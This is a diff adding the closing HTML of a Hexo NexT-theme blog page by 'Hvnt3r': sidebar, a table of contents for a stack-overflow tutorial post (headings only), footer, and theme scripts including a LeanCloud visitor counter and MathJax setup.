+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Hvnt3r" />
+            
+              <p class="site-author-name" itemprop="name">Hvnt3r</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Hvnt3r" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:hvnt3r@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的栈溢出-hello-elf"><span class="nav-number">1.</span> <span class="nav-text">简单的栈溢出_hello_elf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-基本知识"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 基本知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-起手第一步"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 起手第一步</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-在溢出的边缘疯狂试探"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 在溢出的边缘疯狂试探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-寻找目标指令"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 寻找目标指令</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hvnt3r</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">33.7k</span>
+  
+</div>
+
+
+
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("Mlz03BBADnvOzP0kDTeS9A4a-gzGzoHsz", "gbVyqV9usci1PKnM7hcg3uCv");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
